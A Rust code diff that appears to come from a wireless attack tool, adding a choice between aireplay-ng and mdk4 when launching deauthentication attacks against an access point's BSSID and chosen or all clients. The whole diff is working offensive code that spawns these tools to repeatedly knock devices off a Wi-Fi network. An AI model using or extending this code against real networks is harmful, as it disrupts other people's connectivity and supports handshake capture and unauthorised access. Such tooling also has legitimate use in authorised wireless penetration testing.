@@ -6,7 +6,11 @@ use std::process::{Command, Stdio};
 use std::sync::MutexGuard;
 
 /// Launch a deauth attack on a specific AP
-pub fn launch_deauth_attack(ap: AP, specific_clients: Option<Vec<String>>) -> Result<(), Error> {
+pub fn launch_deauth_attack(
+    ap: AP,
+    specific_clients: Option<Vec<String>>,
+    software: AttackSoftware,
+) -> Result<(), Error> {
     let iface = match get_iface() {
         Some(res) => res,
         None => return Err(Error::new("No interface set")),
@@ -18,22 +22,43 @@ pub fn launch_deauth_attack(ap: AP, specific_clients: Option<Vec<String>>) -> Re
         Some(specific_clients) => {
             let mut cli_attack_targets = vec![];
             for cli in specific_clients {
+                let (soft, args) = match software {
+                    AttackSoftware::Aireplay => (
+                        "aireplay-ng",
+                        vec!["-0", "0", "-D", "-a", &ap.bssid, "-c", &cli, &iface],
+                    ),
+                    AttackSoftware::Mdk4 => (
+                        "mdk4",
+                        vec![iface.as_str(), "d", "-B", &ap.bssid, "-S", &cli],
+                    ),
+                };
+
                 cli_attack_targets.push((
                     cli.to_owned(),
-                    Command::new("aireplay-ng")
-                        .args(["-0", "0", "-D", "-a", &ap.bssid, "-c", &cli, &iface])
+                    Command::new(soft)
+                        .args(args)
                         .stdout(Stdio::null())
                         .spawn()?,
                 ));
             }
             AttackedClients::Selection(cli_attack_targets)
         }
-        None => AttackedClients::All(
-            Command::new("aireplay-ng")
-                .args(["-0", "0", "-D", "-a", &ap.bssid, &iface])
-                .stdout(Stdio::null())
-                .spawn()?,
-        ),
+        None => {
+            let (soft, args) = match software {
+                AttackSoftware::Aireplay => (
+                    "aireplay-ng",
+                    vec!["-0", "0", "-D", "-a", &ap.bssid, &iface],
+                ),
+                AttackSoftware::Mdk4 => ("mdk4", vec![iface.as_str(), "d", "-B", &ap.bssid]),
+            };
+
+            AttackedClients::All(
+                Command::new(soft)
+                    .args(args)
+                    .stdout(Stdio::null())
+                    .spawn()?,
+            )
+        }
     };
 
     attack_pool.insert(ap.bssid.to_string(), (ap, attack_targets));
